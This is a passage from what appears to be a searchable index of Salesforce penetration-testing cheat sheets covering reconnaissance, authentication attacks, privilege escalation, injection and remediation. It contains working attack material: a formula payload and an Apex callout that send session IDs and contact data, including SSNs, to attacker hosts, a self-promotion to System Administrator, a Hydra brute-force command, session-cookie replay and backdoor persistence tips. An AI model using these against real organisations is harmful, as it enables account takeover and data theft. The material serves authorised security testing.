<pre><code>SELECT Id, IpAddress, IpAddressMask FROM IpRestriction\n</code></pre> - Setup &gt; Security &gt; Network Access</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#custom-settings-custom-metadata","title":"Custom Settings &amp; Custom Metadata","text":"<ul> <li>Setup &gt; Custom Settings / Custom Metadata</li> <li>Look for hardcoded secrets, API keys, or URLs</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#metadata-api-abuse","title":"Metadata API Abuse","text":"<ul> <li>Unauthorized modification of profiles/validation rules via API (SOAP/REST)</li> <li>Test with <code>/services/Soap/m/XX.0</code> and manipulate metadata</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#8-api-integration-security","title":"8. API &amp; Integration Security","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#connected-apps-oauth","title":"Connected Apps &amp; OAuth","text":"<p>SOQL <pre><code>SELECT Name, CallbackUrl, ConsumerKey FROM ConnectedApplication\n</code></pre></p> <p>Test - Manipulate OAuth <code>redirect_uri</code>, overbroad scopes (<code>full</code>, <code>api</code>) - Use unauthorized/abused OAuth tokens for data exfiltration</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#named-credentials","title":"Named Credentials","text":"<ul> <li>Examine endpoint security (must be HTTPS)</li> <li>Test for SSRF, credential leak via misconfigured objects.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#restsoapbulk-api","title":"REST/SOAP/Bulk API","text":"<ul> <li>Test for excessive permissions via API tokens</li> <li>Abuse <code>/services/data/vXX.0/{sobjects/query/apexrest}</code> endpoints</li> </ul> <p>API Abuse Example <pre><code>curl -H \"Authorization: Bearer &lt;TOKEN&gt;\" \\\n     \"https://&lt;instance&gt;.salesforce.com/services/data/v58.0/sobjects/Contact\"\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#9-client-side-ux-vulnerabilities","title":"9. Client-Side &amp; UX Vulnerabilities","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#xss-dom-based-attacks","title":"XSS &amp; DOM-Based Attacks","text":"<ul> <li>Insert payloads into custom inputs/components or formula fields</li> <li>Look for <code>retURL</code>/<code>startURL</code> open redirect in auth flows</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#clickjackingcsrf","title":"Clickjacking/CSRF","text":"<ul> <li>Setup &gt; Session Settings: Confirm clickjack protection is ON</li> <li>Try embedding Salesforce pages in iframes</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#10-advanced-chainable-attack-vectors","title":"10. Advanced &amp; Chainable Attack Vectors","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#formula-injection","title":"Formula Injection","text":"<p>Payloads <pre><code>HYPERLINK(\"javascript:alert('Formula XSS')\", \"Click\")\nHYPERLINK(\"http://attacker.com/?sid=\"&amp;$Api.Session_ID, \"Export SID\")\n</code></pre> - Query all formula fields with potentially dangerous logic</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#platform-eventprocess-builderflow-exploitation","title":"Platform Event/Process Builder/Flow Exploitation","text":"<ul> <li>Low-priv user triggers system-context automation, e.g., process updates records they can't normally write</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#denial-of-service","title":"Denial of Service","text":"<ul> <li>Infinite Flows/recursive Apex/scheduled job loop</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#11-persistence-lateral-movement-post-exploitation","title":"11. Persistence, Lateral Movement &amp; Post-Exploitation","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#persistence","title":"Persistence","text":"<ul> <li>Create hidden admin or backdoor user via Apex (if possible)</li> <li>Implant malicious Flow or scheduled Apex job for recurring access</li> <li>Register own Connected App for persistent OAuth access</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#lateral-movement","title":"Lateral Movement","text":"<ul> <li>Assign oneself admin permissionSet via vulnerable Flows/Process automation</li> </ul> <p>SOQL <pre><code>INSERT PermissionSetAssignment (PermissionSetId, AssigneeId) VALUES ('0PSxxx', '005xxx')\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/","title":"Salesforce   3","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Phase 1: Reconnaissance &amp; Enumeration</li> <li>Phase 2: Identity &amp; Authentication Attacks</li> <li>Phase 3: Authorization &amp; Access Control Exploitation (The Core)</li> <li>Phase 4: Custom Code &amp; Business Logic Flaws</li> <li>Phase 5: Experience Cloud (Community) &amp; Guest User Exploitation</li> <li>Phase 6: Advanced Exploitation &amp; Data Exfiltration</li> <li>Essential Tooling &amp; Payloads</li> <li>Reporting &amp; Remediation Guidance</li> </ol>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#1-phase-1-reconnaissance-enumeration","title":"1. Phase 1: Reconnaissance &amp; Enumeration","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#11-unauthenticated-discovery","title":"1.1 Unauthenticated Discovery","text":"<ul> <li>Description: Identify public-facing Salesforce assets without credentials.</li> <li>Method:<ul> <li>Google/GitHub Dorking: <pre><code>site:*.my.salesforce.com \"Company Name\"\nsite:*.force.com \"Company Name\"\ninurl:\"/s/login\" site:company.com\n\"sfdx auth url\" \"client_secret\" site:github.com\n</code></pre></li> <li>Enumerate Subdomains: Use tools like <code>subfinder</code> or <code>amass</code> to find domains like <code>community.company.com</code> or <code>partners.company.com</code> that might be CNAMEs to a Salesforce Experience Cloud.</li> </ul> </li> <li>Impact: Maps the external attack surface, identifies login portals, and may reveal leaked credentials or code.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#12-initial-org-user-context-post-auth","title":"1.2 Initial Org &amp; User Context (Post-Auth)","text":"<ul> <li>Description: Understand your environment and privilege level from the inside.</li> <li>Method:<ul> <li>UI Navigation: Go to <code>Setup</code> &gt; <code>Company Information</code>. Note the Organization Edition and Instance.</li> <li>SOQL Queries (Developer Console or Workbench): <pre><code>-- Get current user's profile and key permissions\nSELECT Id, Name, Profile.Name, (SELECT PermissionSet.Name, PermissionSet.IsOwnedByProfile FROM PermissionSetAssignments) FROM User WHERE Id = :UserInfo.getUserId()\n\n-- Check for \"God Mode\" permissions immediately\nSELECT Name FROM PermissionSet WHERE Id IN (SELECT PermissionSetId FROM PermissionSetAssignment WHERE AssigneeId = :UserInfo.getUserId()) AND (PermissionsModifyAllData = true OR PermissionsViewAllData = true OR PermissionsCustomizeApplication = true OR PermissionsAuthorApex = true)\n</code></pre></li> </ul> </li> <li>Impact: Establishes a baseline for testing. Knowing your permissions is the first step to escalating them.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#2-phase-2-identity-authentication-attacks","title":"2. Phase 2: Identity &amp; Authentication Attacks","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#21-password-policy-weakness","title":"2.1 Password Policy Weakness","text":"<ul> <li>Description: Exploiting weak password policies to facilitate brute-force or spraying attacks.</li> <li>Method:<ul> <li>UI Navigation: <code>Setup</code> &gt; <code>Security</code> &gt; <code>Password Policies</code>.</li> <li>Check for:<ul> <li>Minimum Length &lt; 12 characters</li> <li>No Complexity Requirement</li> <li>Lockout Threshold &gt; 5 attempts</li> </ul> </li> </ul> </li> <li>Impact: Increased likelihood of account takeover through password guessing or credential stuffing.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#22-mfa-bypass","title":"2.2 MFA Bypass","text":"<ul> <li>Description: Identifying users or scenarios where Multi-Factor Authentication is not enforced.</li> <li>Method:<ul> <li>SOQL Query: Find powerful users without MFA.     <pre><code>SELECT u.Username, u.Profile.Name FROM User u WHERE u.Profile.PermissionsModifyAllData = true AND NOT EXISTS (SELECT Id FROM TwoFactorInfo WHERE UserId = u.Id)\n</code></pre></li> <li>API Login Test: Attempt to log in via an API (e.g., using Postman or a Python script) with just a username and password. Weak configurations may not enforce MFA for API-only sessions.</li> </ul> </li> <li>Impact: Bypasses a critical security control, making high-privilege accounts vulnerable to simple credential compromise.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#3-phase-3-authorization-access-control-exploitation-the-core","title":"3. Phase 3: Authorization &amp; Access Control Exploitation (The Core)","text":"<p>This is where the most critical Salesforce-specific vulnerabilities are found.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#31-vertical-privilege-escalation-abusing-god-mode-permissions","title":"3.1 Vertical Privilege Escalation (Abusing \"God Mode\" Permissions)","text":"<ul> <li>Description: Identifying users or profiles with excessive administrative permissions.</li> <li>Method (SOQL): Hunt for users assigned these permissions via their Profile or a Permission Set.     <pre><code>-- Find users who can bypass all data sharing\nSELECT Assignee.Name, Assignee.Profile.Name FROM PermissionSetAssignment WHERE (PermissionSet.PermissionsModifyAllData = true OR PermissionSet.PermissionsViewAllData = true) AND Assignee.IsActive = true\n\n-- Find users who can alter the system configuration or code\nSELECT Assignee.Name, Assignee.Profile.Name FROM PermissionSetAssignment WHERE (PermissionSet.PermissionsCustomizeApplication = true OR PermissionSet.PermissionsAuthorApex = true) AND Assignee.IsActive = true\n</code></pre></li> <li>Impact: A single non-admin user with these rights can lead to a full tenant compromise, data theft, or malicious modification of business logic.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#32-horizontal-data-exposure-sharing-model-flaws","title":"3.2 Horizontal Data Exposure (Sharing Model Flaws)","text":"<ul> <li>Description: Gaining access to records (e.g., Accounts, Cases) that a user should not see based on their role.</li> <li>Method:<ul> <li>Check OWD: <code>Setup</code> &gt; <code>Security</code> &gt; <code>Sharing Settings</code>. Look for any object with Org-Wide Defaults of <code>Public Read/Write</code>. This is an immediate, critical-risk finding.</li> <li>Test for IDOR: As a low-privilege user, obtain the 15 or 18-digit Record ID of a record owned by another user. Attempt to access it directly via the URL: <code>https://&lt;instance&gt;.lightning.force.com/lightning/r/&lt;ObjectName&gt;/&lt;RECORD_ID&gt;/view</code>. An \"Insufficient Privileges\" error is the expected secure behavior.</li> </ul> </li> <li>Impact: Allows sales reps to see competitor pipelines, support agents to see sensitive HR cases, leading to data leakage and business integrity issues.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#4-phase-4-custom-code-business-logic-flaws","title":"4. Phase 4: Custom Code &amp; Business Logic Flaws","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#41-soql-injection","title":"4.1 SOQL Injection","text":"<ul> <li>Description: Exploiting dynamically constructed SOQL queries to bypass security controls.</li> <li>Method:<ul> <li>Static Analysis (Code Review): Search Apex code for <code>Database.query()</code> using string concatenation.     <pre><code>// VULNERABLE:\nString query = 'SELECT Id, Name FROM Contact WHERE LastName = \\'' + userInput + '\\'';\nList&lt;Contact&gt; contacts = Database.query(query);\n\n// SECURE (Uses Bind Variable):\nList&lt;Contact&gt; contacts = [SELECT Id FROM Contact WHERE LastName = :userInput];\n</code></pre></li> <li>Dynamic Analysis: In a search field, inject a single quote (<code>'</code>) or SOQL logic (<code>' OR Name != '</code>). A database error or an unexpectedly large result set indicates a vulnerability.</li> </ul> </li> <li>Impact: Full data extraction from any object, denial of service, or authentication bypass.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#42-insecure-apex-execution-context-without-sharing","title":"4.2 Insecure Apex Execution Context (<code>without sharing</code>)","text":"<ul> <li>Description: This is the most common and critical Salesforce code vulnerability. An Apex class running <code>without sharing</code> intentionally ignores all of the user's record-level sharing permissions, running in a \"god mode\" for data access.</li> <li>Method:<ul> <li>Static Analysis: Search the codebase for Apex classes declared as <code>public without sharing class</code> or with no sharing keyword specified in an <code>@AuraEnabled</code> context (which defaults to <code>without sharing</code>).</li> <li>Dynamic Analysis (Burp Suite): As a low-privilege user, perform an action via a custom component (e.g., save a record). If the action succeeds even though you lack the underlying permissions, the backing Apex code is running <code>without sharing</code>.</li> </ul> </li> <li>Impact: Critical privilege escalation. Allows a low-privilege user to read, create, or modify any record accessible to the system, completely bypassing the security model.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#43-cross-site-scripting-xss-in-visualforcelwc","title":"4.3 Cross-Site Scripting (XSS) in Visualforce/LWC","text":"<ul> <li>Description: Injecting malicious client-side scripts into custom UI components.</li> <li>Method:<ul> <li>Visualforce: Look for <code>&lt;apex:outputText value=\"{!...}\" escape=\"false\" /&gt;</code>.</li> <li>Lightning (LWC/Aura): Look for direct DOM manipulation (<code>element.innerHTML = ...</code>) or use of <code>lwc:dom=\"manual\"</code>.</li> </ul> </li> <li>Impact: Session hijacking, credential theft, performing actions on behalf of the victim.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#5-phase-5-experience-cloud-community-guest-user-exploitation","title":"5. Phase 5: Experience Cloud (Community) &amp; Guest User Exploitation","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#51-over-privileged-guest-user","title":"5.1 Over-Privileged Guest User","text":"<ul> <li>Description: The unauthenticated \"Guest User\" has excessive permissions, allowing public access to internal data. This is a top source of data breaches on the platform.</li> <li>Method:<ul> <li>UI Navigation: <code>Setup</code> &gt; <code>Digital Experiences</code> &gt; <code>All Sites</code>. For each a site, click <code>Workspaces</code> &gt; <code>Administration</code> &gt; <code>Pages</code> &gt; <code>Go to Force.com</code> and click Public Access Settings.</li> <li>Check Permissions: In the Guest User's Profile, review \"Object Settings\". This profile should have NO access to standard objects like Account, Contact, or User by default. Any <code>Read</code> or <code>View</code> access is a potential high-risk finding.</li> </ul> </li> <li>Impact: Anonymous, unauthenticated data exfiltration of customer lists, user details, and sensitive business data.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#52-guest-user-sharing-rule-bypass","title":"5.2 Guest User Sharing Rule Bypass","text":"<ul> <li>Description: Even with a locked-down profile, guest users can see records if a misconfigured Sharing Rule grants access to records owned by the guest.</li> <li>Method:<ul> <li>UI Navigation: In <code>Setup</code> &gt; <code>Security</code> &gt; <code>Sharing Settings</code>, enable the setting <code>Secure guest user record access</code>. If this is disabled, it is a critical finding.</li> <li>Test for IDORs: As an unauthenticated guest user browsing the community, attempt to access internal record IDs.</li> </ul> </li> <li>Impact: Allows unauthenticated users to view specific records that have been unintentionally shared with the public.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#6-phase-6-advanced-exploitation-data-exfiltration","title":"6. Phase 6: Advanced Exploitation &amp; Data Exfiltration","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#61-full-org-takeover-via-author-apex","title":"6.1 Full Org Takeover via <code>Author Apex</code>","text":"<ul> <li>Description: A user with the <code>Author Apex</code> permission can execute arbitrary code and grant themselves System Administrator rights.</li> <li>Method (<code>Execute Anonymous</code> in Developer Console): <pre><code>// Find the System Administrator profile\nProfile p = [SELECT Id FROM Profile WHERE Name='System Administrator'];\n\n// Get the current user\nUser u = [SELECT Id FROM User WHERE Id = :UserInfo.getUserId()];\n\n// Assign the System Administrator profile to self\nu.ProfileId = p.Id;\nupdate u;\n</code></pre></li> <li>Impact: Complete, persistent compromise of the Salesforce tenant.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#62-covert-data-exfiltration-via-callouts","title":"6.2 Covert Data Exfiltration via Callouts","text":"<ul> <li>Description: Using Apex code to send sensitive data to an external, attacker-controlled server.</li> <li>Method (<code>Execute Anonymous</code> or in a Trigger): <pre><code>// Query sensitive data\nList&lt;Contact&gt; sensitiveContacts = [SELECT Name, Email, SSN__c FROM Contact LIMIT 10];\n\n// Prepare the exfiltration request\nHttpRequest req = new HttpRequest();\nreq.setEndpoint('https://attacker-controlled-server.com/log'); // Your Burp Collaborator or server\nreq.setMethod('POST');\nreq.setHeader('Content-Type', 'application/json');\nreq.setBody(JSON.serialize(sensitiveContacts));\n\n// Send the data\nnew Http().send(req);\n</code></pre></li> <li>Impact: Covert, large-scale data theft that bypasses standard Salesforce event monitoring.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#7-essential-tooling-payloads","title":"7. Essential Tooling &amp; Payloads","text":"<ul> <li>Browser Extensions:<ul> <li>Salesforce Inspector: Absolutely essential for on-the-fly data and metadata inspection.</li> <li>Salesforce Advanced Code Searcher: Quickly search an org's codebase.</li> </ul> </li> <li>Web &amp; API Testing:<ul> <li>Burp Suite Professional: Mandatory for intercepting and manipulating <code>/aura</code>, <code>/apexremote</code>, and API traffic.</li> <li>Workbench: A powerful web-based tool for SOQL queries, REST API exploration, and metadata browsing.</li> </ul> </li> <li>CLI &amp; Static Analysis:<ul> <li>Salesforce CLI (SFDX): For retrieving metadata (code, profiles, etc.) for offline analysis.</li> <li>PMD Source Code Analyzer: Use with the Apex rule set to find security flaws in downloaded code.</li> </ul> </li> <li>Go-To SOQLi Payload: <code>' OR Name != '</code> (classic boolean-based test)</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%203/#8-reporting-remediation-guidance","title":"8. Reporting &amp; Remediation Guidance","text":"<ul> <li>Prioritize by Impact: Don't just report \"SOQL Injection.\" Report \"Authenticated Sales User Can Exfiltrate All Customer PII via SOQL Injection in Search Component.\"</li> <li>Provide Actionable Fixes:<ul> <li>For Code: Provide the exact line number and the secure coding alternative (e.g., \"Replace <code>Database.query()</code> with a static query using bind variables.\").</li> <li>For Permissions: Recommend creating granular Permission Sets following the Principle of Least Privilege. Advise against cloning the \"System Administrator\" profile.</li> <li>For Configuration: Provide the exact navigation path in <code>Setup</code> and the setting to change (e.g., \"In Sharing Settings, set the OWD for the <code>Case</code> object to <code>Private</code>.\").</li> </ul> </li> <li>Reference Official Docs: Link to Salesforce help articles or security guides to add credibility and assist the development team.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/","title":"Salesforce   4","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Engagement Preparation &amp; Scoping</li> <li>Reconnaissance &amp; Environment Mapping</li> <li>Authentication &amp; Identity Testing</li> <li>Authorization &amp; Access Control Testing</li> <li>Data Exposure &amp; Exfiltration Testing</li> <li>Custom Code &amp; Business Logic Testing</li> <li>Platform Configuration &amp; Misconfiguration Testing</li> <li>API &amp; Integration Security Testing</li> <li>Client-Side &amp; Web Vulnerabilities Testing</li> <li>Advanced Exploitation &amp; Privilege Escalation</li> <li>Persistence &amp; Defense Evasion</li> <li>Reporting &amp; Remediation Framework</li> <li>Tools &amp; References</li> </ol>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#engagement-preparation-scoping","title":"Engagement Preparation &amp; Scoping","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#objective","title":"Objective","text":"<p>Define the scope, gather initial intelligence, and establish access for testing to ensure ethical boundaries and maximize test coverage.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#steps","title":"Steps","text":"<ul> <li>Confirm Salesforce Edition &amp; Clouds: Identify the edition (e.g., Enterprise, Unlimited) and clouds in use (e.g., Sales Cloud, Marketing Cloud) to understand feature sets and limitations.</li> <li>Request Test Accounts: Obtain multiple accounts with varying privilege levels (e.g., System Admin, Standard User, Guest User) to test permissions comprehensively.</li> <li>Identify Testing Constraints: Define limitations (e.g., no destructive testing, avoid production data) to align with RoE.</li> <li>Obtain API Access: Secure OAuth credentials or API tokens for automated testing and enumeration.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#tools","title":"Tools","text":"<ul> <li>Salesforce CLI (<code>sfdx</code>)</li> <li><code>simple_salesforce</code> (Python library)</li> <li>Postman (API exploration)</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#impact","title":"Impact","text":"<p>Proper scoping ensures ethical testing and prevents legal or service disruptions while maximizing coverage of attack surfaces.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#reconnaissance-environment-mapping","title":"Reconnaissance &amp; Environment Mapping","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#21-org-metadata-enumeration","title":"2.1 Org Metadata Enumeration","text":"<p>Description: Gather critical metadata about the Salesforce org (Org ID, Instance, Edition) to identify potential attack vectors. Root Cause: Publicly accessible metadata or insufficient API restrictions may expose org details. Enumeration Techniques: - UI Navigation: Login as an admin or highest privilege account, navigate to <code>Setup &gt; Company Settings &gt; Company Information</code> to obtain Org ID, Instance (e.g., NA52), and Edition. - Salesforce CLI: Extract metadata for analysis.   <pre><code>sfdx force:auth:web:login -a targetOrg\nsfdx force:mdapi:retrieve -r ./metadata -u targetOrg\n</code></pre> - Apex Query (Developer Console): If accessible, run the following to query org details.   <pre><code>Organization org = [SELECT Id, Name, InstanceName, OrganizationType FROM Organization LIMIT 1];\nSystem.debug('Org Details: ' + org);\n</code></pre> Impact: Reveals edition-specific features (e.g., Unlimited Edition allows more custom code) and instance details for targeted attacks. Remediation: Restrict metadata access to admin roles only; monitor API calls for unusual metadata queries.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#22-user-role-enumeration","title":"2.2 User &amp; Role Enumeration","text":"<p>Description: Identify users, roles, and profiles to target high-privilege accounts for attacks. Root Cause: Lack of restrictions on user enumeration via UI or API. Enumeration Techniques: - UI Navigation: Navigate to <code>Setup &gt; Users &gt; Users</code> to list active users, noting profiles and roles. - SOQL Query (Developer Console): <pre><code>SELECT Id, Username, Email, FirstName, LastName, Profile.Name, UserRole.Name, IsActive \nFROM User \nWHERE IsActive = TRUE \nORDER BY Profile.Name \nLIMIT 200\n</code></pre> - REST API Enumeration (if API access available): <pre><code>curl -H \"Authorization: Bearer &lt;YOUR_ACCESS_TOKEN&gt;\" \\\n     \"https://&lt;INSTANCE&gt;.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Username,Email+FROM+User+WHERE+IsActive=TRUE\" \\\n     -o users.json\n</code></pre> Impact: Enables social engineering, phishing, or brute-force attacks on admin accounts. Remediation: Restrict user list visibility to admins; enforce MFA; apply IP allowlisting for admin logins.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#23-custom-code-footprint-mapping","title":"2.3 Custom Code Footprint Mapping","text":"<p>Description: Identify custom-developed Apex, Visualforce, and Lightning Web Components (LWC) as primary attack surfaces. Root Cause: In-house or contractor-developed code often lacks secure coding practices, introducing logic flaws. Enumeration Techniques: - UI Navigation: Navigate to <code>Setup &gt; Custom Code</code> to list Apex Classes, Triggers, Visualforce Pages, and Lightning Components. Focus on components with no <code>NamespacePrefix</code> (indicates custom, not managed package). - SOQL Query (Developer Console): <pre><code>SELECT Name, ApiVersion, NamespacePrefix FROM ApexClass WHERE ApiVersion &lt; 45.0\n</code></pre>   (Older API versions have weaker security defaults.) - Static Analysis Tools: Use PMD or Checkmarx to grep for risky keywords like <code>Database.query(</code>, <code>without sharing</code>, or <code>escape=\"false\"</code>. Impact: Defines custom attack surfaces for vulnerabilities like SOQL injection or XSS. Remediation: Implement a secure SDLC; mandate SAST scanning in CI/CD pipelines; enforce API version upgrades.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#authentication-identity-testing","title":"Authentication &amp; Identity Testing","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#31-password-policy-bypass","title":"3.1 Password Policy Bypass","text":"<p>Description: Weak password policies (e.g., short length, no complexity) enable brute-force or credential stuffing attacks. Root Cause: Lack of strong password requirements or lockout mechanisms. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Security &gt; Password Policies</code> for minimum length, complexity, history, and lockout settings. - SOQL Query (Developer Console): <pre><code>SELECT MinimumPasswordLength, PasswordComplexity, PasswordHistory, LockoutInterval FROM Organization\n</code></pre> - Exploitation Steps:   1. Enumerate policy parameters from UI or SOQL.   2. Use tools like Burp Suite Intruder or Hydra for brute-force attacks on <code>https://login.salesforce.com/</code>.      <pre><code>hydra -l &lt;targetuser&gt; -P wordlist.txt https://login.salesforce.com/ -s 443 http-post-form \"/?un=^USER^&amp;pw=^PASS^&amp;Login=Login:incorrect\"\n</code></pre> Impact: Account compromise via brute-force or stolen credentials. Remediation: Enforce 12+ character passwords with mixed case, numbers, and symbols; set lockout after 5 failed attempts; rotate passwords every 90 days.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#32-multi-factor-authentication-mfa-gaps","title":"3.2 Multi-Factor Authentication (MFA) Gaps","text":"<p>Description: Lack of MFA or inconsistent enforcement exposes high-privilege accounts to compromise. Root Cause: MFA not enforced for all users, especially admins or API users. Enumeration Techniques: - SOQL Query (Developer Console): <pre><code>SELECT Id, Username, UserPreferencesMfaRequired FROM User WHERE IsActive = TRUE\n</code></pre> - UI Navigation: Check <code>Setup &gt; Security &gt; Multi-Factor Authentication</code> for policies. - Exploitation Steps:   1. Identify users without <code>UserPreferencesMfaRequired = TRUE</code>.   2. Target these accounts for credential reuse or brute-force attacks using methods from 3.1. Impact: Account takeover without secondary authentication barriers. Remediation: Enforce MFA for all users, especially admins and integration accounts; use session security levels to require MFA for sensitive operations.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#33-session-management-exploits","title":"3.3 Session Management Exploits","text":"<p>Description: Weak session controls (e.g., long timeouts, no IP restrictions) enable session hijacking. Root Cause: Insufficient session security settings or lack of HttpOnly/Secure flags. Enumeration Techniques: - UI Navigation: Review <code>Setup &gt; Session Settings</code> for timeout, IP enforcement, and session locking policies. - Exploitation Steps:   1. Steal a session cookie (<code>sid</code>) from a victim\u2019s browser (via XSS or phishing).   2. Replay the session using a tool like cURL:      <pre><code>curl -H \"Cookie: sid=&lt;SESSIONID&gt;\" https://&lt;INSTANCE&gt;.my.salesforce.com/home/home.jsp\n</code></pre>   3. Test if the session remains valid from different IPs (indicating lack of IP pinning). Impact: Unauthorized access persistence via hijacked sessions. Remediation: Enforce IP restrictions on profiles; set aggressive session timeouts (e.g., 2 hours); enable session IP locking and HttpOnly/Secure attributes.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#authorization-access-control-testing","title":"Authorization &amp; Access Control Testing","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#41-over-privileged-profiles-permission-sets","title":"4.1 Over-Privileged Profiles &amp; Permission Sets","text":"<p>Description: Profiles or permission sets with excessive permissions (e.g., \u201cView All Data\u201d) allow unauthorized access. Root Cause: Admins grant broad permissions for convenience, violating least privilege principles. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Users &gt; Profiles</code> for system permissions like \u201cView All Data\u201d or \u201cModify All Data\u201d. - SOQL Query (Developer Console): <pre><code>SELECT Id, Label, PermissionsViewAllData, PermissionsModifyAllData \nFROM PermissionSet \nWHERE PermissionsViewAllData = TRUE OR PermissionsModifyAllData = TRUE\n</code></pre> <pre><code>SELECT Assignee.Name, PermissionSet.Label \nFROM PermissionSetAssignment \nWHERE PermissionSet.PermissionsViewAllData = TRUE\n</code></pre> - Exploitation Steps:   1. Log in with a test account tied to an over-privileged profile.   2. Navigate to objects like <code>Account</code> or <code>Opportunity</code> and verify access to all records beyond user scope.   3. Attempt to modify or delete records to confirm \u201cModify All Data\u201d impact. Impact: Unauthorized access to or manipulation of org-wide data. Remediation: Adhere to least privilege; disable \u201cView All Data\u201d and \u201cModify All Data\u201d unless essential; audit permission sets regularly.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#42-sharing-rule-overexposure","title":"4.2 Sharing Rule Overexposure","text":"<p>Description: Overly permissive sharing rules expose data beyond intended users. Root Cause: Misconfigured manual sharing or Org-Wide Defaults (OWD) set to \u201cPublic Read/Write\u201d. Enumeration Techniques: - UI Navigation: Review <code>Setup &gt; Security &gt; Sharing Settings</code> for OWD and sharing rules per object. - Exploitation Steps:   1. Log in as a low-privilege user (e.g., Standard User).   2. Navigate to an object with suspected sharing rules (e.g., <code>Account</code> tab).   3. Attempt to view/edit records not owned by the user.   4. If API access is available, query records:      <pre><code>curl -H \"Authorization: Bearer &lt;YOUR_ACCESS_TOKEN&gt;\" \\\n     \"https://&lt;INSTANCE&gt;.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Name+FROM+Account+LIMIT+100\" \\\n     -o accounts.json\n</code></pre> Impact: Data leakage or unauthorized modifications. Remediation: Set OWD to \u201cPrivate\u201d for sensitive objects; use role hierarchies and manual sharing sparingly; audit sharing rules.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#43-guest-user-community-exploitation","title":"4.3 Guest User &amp; Community Exploitation","text":"<p>Description: Guest users in Communities or Sites often have unintended access to objects or records. Root Cause: Overly permissive OWD or sharing rules for guest profiles. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Sites &gt; [Site Label] &gt; Public Access Settings</code> for guest profile permissions. - SOQL Query (Developer Console): <pre><code>SELECT Id, Name FROM User WHERE Profile.Name LIKE '%Guest%'\n</code></pre> - Exploitation Steps:   1. Access public API endpoints or site URLs (e.g., <code>https://&lt;siteurl&gt;.force.com/services/data/v58.0/sobjects/</code>).   2. Query vulnerable objects like <code>Case</code> or <code>Contact</code>:      <pre><code>curl \"https://&lt;siteurl&gt;.force.com/services/data/v58.0/query?q=SELECT+Id,Name,Email+FROM+Contact\"\n</code></pre>   3. Test creation/modification rights:      <pre><code>curl -X POST \"https://&lt;siteurl&gt;.force.com/services/data/v58.0/sobjects/Case\" \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"Subject\": \"Test Case\", \"Description\": \"Injected\"}'\n</code></pre> Impact: Critical data exposure or manipulation by unauthenticated users. Remediation: Remove CRUD permissions from guest profiles unless required; set OWD to 